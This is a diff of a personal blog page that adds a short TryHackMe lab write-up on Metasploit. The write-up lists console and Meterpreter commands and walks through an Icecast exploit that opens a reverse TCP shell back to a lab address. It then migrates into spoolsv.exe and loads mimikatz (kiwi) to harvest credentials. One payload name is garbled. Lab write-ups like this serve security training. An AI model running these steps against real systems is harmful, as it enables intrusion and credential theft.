@@ -20,15 +20,21 @@
     var CONFIG = {"hostname":"0xdeciverangel.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="0xdeciverAngel">
-<meta property="og:url" content="https://0xdeciverangel.github.io/archives/2021/06/index.html">
+  <meta name="description" content="metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe Room Metasploit">
+<meta property="og:url" content="https://0xdeciverangel.github.io/2021/06/08/TryHackMe-Room-Metasploit/index.html">
 <meta property="og:site_name" content="0xdeciverAngel">
+<meta property="og:description" content="metasploit">
 <meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2021-06-08T10:46:01.000Z">
+<meta property="article:modified_time" content="2021-06-08T10:58:36.916Z">
 <meta property="article:author" content="0xdeciverAngel">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="TryHackme">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://0xdeciverangel.github.io/archives/2021/06/">
+<link rel="canonical" href="https://0xdeciverangel.github.io/2021/06/08/TryHackMe-Room-Metasploit/">
 
 
 <script id="page-configurations">
@@ -36,12 +42,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-TW'
   };
 </script>
 
-  <title>歸檔 | 0xdeciverAngel</title>
+  <title>TryHackMe Room Metasploit | 0xdeciverAngel</title>
   
 
 
@@ -139,70 +145,124 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共有 2 篇文章。 繼續努力。</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://0xdeciverangel.github.io/2021/06/08/TryHackMe-Room-Metasploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/31663805?v=4">
+      <meta itemprop="name" content="0xdeciverAngel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xdeciverAngel">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TryHackMe Room Metasploit
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+              
+
+              <time title="創建時間：2021-06-08 06:46:01 / 修改時間：06:58:36" itemprop="dateCreated datePublished" datetime="2021-06-08T06:46:01-04:00">2021-06-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+        <h1 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h1><span id="more"></span>
+<ul>
+<li>msfconsole<h2 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h2></li>
+<li>msfdb init<ul>
+<li>db_status</li>
+<li>help</li>
+<li>search</li>
+<li>use</li>
+<li>info</li>
+<li>connect</li>
+<li>set</li>
+<li>setg</li>
+<li>get</li>
+<li>spool</li>
+<li>save</li>
+<li>load</li>
+<li>db_nmap -sV ip</li>
+<li>jobs</li>
+<li>use ??</li>
+<li>sessions</li>
+<li>run or exploit</li>
+<li>getuid</li>
+<li>migrate</li>
+<li>sysinfo </li>
+<li>upload</li>
+<li>getprivs</li>
+<li>ipconfig</li>
+<li>ps</li>
+<li>run /post/windows/gather/checkvm</li>
+<li>run post/multi/recon/local_exploit_suggester</li>
+<li>run autoroute -n ip mask</li>
+<li>bg</li>
+<li>run post/windows/manage/enable_rdp</li>
+<li>sessions -i 0</li>
+</ul>
+</li>
+</ul>
+<h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><p>First scan port <code>db_namp -sV ip</code><br>check<code>vlun</code> or <code>host</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/http/icecast_header) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/http/icecast_header):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.10.107.162    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT   8000             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpresearch server/socks5ter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.8.9.197       yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>then run attack,then you will get a shell</p>
+<p>run <code>ps</code> get the pid of <code>spoolsv.exe.</code>,run <code>migrate &#123;pid&#125;</code></p>
+<p>it will tell you <code>insufficient privileges</code> ,use <code>getuid</code> or <code>sysinfo</code></p>
+<p>run <code>load kiwi</code> to load mimikatz</p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-06-08T06:46:01-04:00"
-              content="2021-06-08">
-          06-08
-        </time>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+              <a href="/tags/TryHackme/" rel="tag"># TryHackme</a>
+          </div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/06/08/TryHackMe-Room-Metasploit/" itemprop="url">
-            <span itemprop="name">TryHackMe Room Metasploit</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-06-06T12:27:45-04:00"
-              content="2021-06-06">
-          06-06
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/06/06/hello-world/" itemprop="url">
-            <span itemprop="name">Hello World</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+        
 
 
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/06/hello-world/" rel="prev" title="Hello World">
+      <i class="fa fa-chevron-left"></i> Hello World
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-  </div>
+      </footer>
+    
+  </article>
   
   
-  
-
   
 
 
@@ -255,6 +315,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#metasploit"><span class="nav-number">1.</span> <span class="nav-text">metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cmd"><span class="nav-number">1.1.</span> <span class="nav-text">cmd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#task"><span class="nav-number">1.2.</span> <span class="nav-text">task</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
